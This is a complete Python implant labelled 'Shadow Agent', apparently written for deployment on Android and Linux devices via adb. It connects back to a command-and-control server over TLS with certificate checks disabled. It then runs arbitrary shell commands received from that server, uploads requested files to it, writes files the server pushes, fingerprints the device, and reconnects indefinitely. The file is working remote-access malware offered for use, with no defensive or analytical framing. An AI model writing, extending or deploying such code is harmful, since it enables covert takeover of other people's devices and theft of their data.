#!/usr/bin/env python3
"""
Shadow Agent — Lightweight Implant
====================================
Connects back to C2 over TLS, executes commands, exfiltrates files.
Designed to be deployed on target Android/Linux devices.

Deploy: adb push shadow_agent.py /data/local/tmp/ && adb shell python3 /data/local/tmp/shadow_agent.py
"""

import os
import sys
import json
import time
import socket
import ssl
import struct
import hashlib
import hmac
import subprocess
import threading
import platform
from pathlib import Path

# ─── Inline crypto (no external deps) ────────────────────────────────────────

class CryptoEngine:
    def __init__(self, key):
        self.key = hashlib.sha256(key.encode() if isinstance(key, str) else key).digest()

    def encrypt(self, plaintext):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        iv = os.urandom(16)
        ciphertext = self._xor_cipher(plaintext, iv)
        mac = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()
        return iv + ciphertext + mac

    def decrypt(self, data):
        iv = data[:16]
        mac = data[-32:]
        ciphertext = data[16:-32]
        expected = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()
        if not hmac.compare_digest(mac, expected):
            raise ValueError("HMAC mismatch")
        return self._xor_cipher(ciphertext, iv)

    def _xor_cipher(self, data, iv):
        ks = b''
        ctr = 0
        while len(ks) < len(data):
            block = hmac.new(self.key, iv + struct.pack('>I', ctr), hashlib.sha256).digest()
            ks += block
            ctr += 1
        return bytes(a ^ b for a, b in zip(data, ks[:len(data)]))


# ─── Secure Channel (mirrors server implementation) ──────────────────────────

class SecureChannel:
    HEADER_SIZE = 8
    MSG_DATA      = 0x01
    MSG_FILE      = 0x02
    MSG_COMMAND   = 0x03
    MSG_RESPONSE  = 0x04
    MSG_HEARTBEAT = 0x05
    MSG_SHELL     = 0x06

    def __init__(self, sock, crypto_key=None):
        self.sock = sock
        self.crypto = CryptoEngine(crypto_key) if crypto_key else None

    def send_message(self, msg_type, data):
        if isinstance(data, str):
            data = data.encode()
        if isinstance(data, dict):
            data = json.dumps(data).encode()
        if self.crypto:
            data = self.crypto.encrypt(data)
        header = struct.pack('>II', len(data), msg_type)
        self.sock.sendall(header + data)

    def recv_message(self):
        header = self._recv_exact(self.HEADER_SIZE)
        if not header:
            return None, None
        length, msg_type = struct.unpack('>II', header)
        if length > 50 * 1024 * 1024:
            raise ValueError("Oversized message")
        data = self._recv_exact(length)
        if self.crypto:
            data = self.crypto.decrypt(data)
        return msg_type, data

    def send_file(self, filepath):
        filepath = Path(filepath)
        size = filepath.stat().st_size
        fhash = hashlib.sha256()
        meta = json.dumps({'filename': filepath.name, 'size': size, 'chunks': (size + 65535) // 65536})
        self.send_message(self.MSG_FILE, meta)
        with open(filepath, 'rb') as f:
            while True:
                chunk = f.read(65536)
                if not chunk:
                    break
                fhash.update(chunk)
                self.send_message(self.MSG_DATA, chunk)
        self.send_message(self.MSG_RESPONSE, json.dumps({'status': 'complete', 'sha256': fhash.hexdigest()}))

    def recv_file(self, output_dir):
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        _, meta_data = self.recv_message()
        meta = json.loads(meta_data)
        filepath = output_dir / meta['filename']
        fhash = hashlib.sha256()
        with open(filepath, 'wb') as f:
            for _ in range(meta['chunks']):
                _, chunk = self.recv_message()
                fhash.update(chunk)
                f.write(chunk)
        _, comp = self.recv_message()
        return str(filepath)

    def _recv_exact(self, n):
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data


# ─── Agent Core ──────────────────────────────────────────────────────────────

class ShadowAgent:
    """Lightweight agent that connects to the C2 server and executes commands."""

    def __init__(self, c2_host, c2_port, crypto_key, retry_delay=30, max_retries=0):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.crypto_key = crypto_key
        self.retry_delay = retry_delay
        self.max_retries = max_retries  # 0 = infinite
        self.channel = None
        self.running = True

    def _connect(self):
        """Establish TLS connection to C2."""
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(15)
        raw.connect((self.c2_host, self.c2_port))
        tls_sock = ctx.wrap_socket(raw, server_hostname=self.c2_host)
        self.channel = SecureChannel(tls_sock, self.crypto_key)

    def _register(self):
        """Send registration info to C2."""
        info = {
            'os': platform.system(),
            'release': platform.release(),
            'hostname': platform.node(),
            'user': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
            'uid': os.getuid() if hasattr(os, 'getuid') else -1,
            'pid': os.getpid(),
            'arch': platform.machine(),
            'cwd': os.getcwd(),
            'timestamp': time.time(),
        }

        # Android-specific info
        try:
            model = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=3)
            if model.returncode == 0:
                info['model'] = model.stdout.strip()
                info['os'] = 'Android'
                sdk = subprocess.run(['getprop', 'ro.build.version.sdk'], capture_output=True, text=True, timeout=3)
                info['sdk'] = sdk.stdout.strip()
        except Exception:
            pass

        self.channel.send_message(SecureChannel.MSG_DATA, json.dumps(info))

    def _execute_command(self, cmd):
        """Execute a shell command and return the output."""
        try:
            if cmd.startswith('__download__ '):
                # File download request from C2
                filepath = cmd.split(' ', 1)[1]
                if os.path.exists(filepath):
                    self.channel.send_file(filepath)
                    return None  # File transfer handled separately
                else:
                    return f"[Error] File not found: {filepath}"

            # Regular shell command
            proc = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120,
                cwd='/'
            )
            output = proc.stdout
            if proc.stderr:
                output += f"\n[stderr]\n{proc.stderr}"
            return output if output else "[No output]"

        except subprocess.TimeoutExpired:
            return "[Command timed out after 120s]"
        except Exception as e:
            return f"[Error] {str(e)}"

    def _main_loop(self):
        """Main command processing loop."""
        while self.running:
            try:
                msg_type, data = self.channel.recv_message()
                if msg_type is None:
                    break  # Connection lost

                if msg_type == SecureChannel.MSG_COMMAND:
                    cmd = data.decode() if isinstance(data, bytes) else str(data)
                    result = self._execute_command(cmd)
                    if result is not None:
                        self.channel.send_message(SecureChannel.MSG_RESPONSE, result)

                elif msg_type == SecureChannel.MSG_HEARTBEAT:
                    self.channel.send_message(SecureChannel.MSG_HEARTBEAT, b'pong')

                elif msg_type == SecureChannel.MSG_FILE:
                    # Receiving a file from C2
                    # Re-read the rest of file transfer
                    meta = json.loads(data)
                    filepath = Path('/data/local/tmp') / meta['filename']
                    with open(filepath, 'wb') as f:
                        for _ in range(meta.get('chunks', 1)):
                            _, chunk = self.channel.recv_message()
                            f.write(chunk)
                    # Consume completion message
                    self.channel.recv_message()
                    self.channel.send_message(SecureChannel.MSG_RESPONSE, f"File saved: {filepath}")

            except Exception:
                break

    def run(self):
        """Main entry point with reconnection logic."""
        retries = 0
        while self.running:
            try:
                self._connect()
                self._register()
                retries = 0  # Reset on success
                self._main_loop()
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception:
                pass

            # Reconnection
            if self.max_retries > 0:
                retries += 1
                if retries > self.max_retries:
                    break

            if self.running:
                time.sleep(self.retry_delay)


# ─── Entry Point ─────────────────────────────────────────────────────────────
if __name__ == '__main__':
    # Configuration — set these before deployment
    C2_HOST = os.getenv('SHADOW_C2_HOST', '127.0.0.1')
    C2_PORT = int(os.getenv('SHADOW_C2_PORT', '4443'))
    CRYPTO_KEY = os.getenv('SHADOW_KEY', 'default_shadow_key')

    # Parse CLI args if provided
    if len(sys.argv) >= 3:
        C2_HOST = sys.argv[1]
        C2_PORT = int(sys.argv[2])
    if len(sys.argv) >= 4:
        CRYPTO_KEY = sys.argv[3]

    agent = ShadowAgent(C2_HOST, C2_PORT, CRYPTO_KEY)
    agent.run()
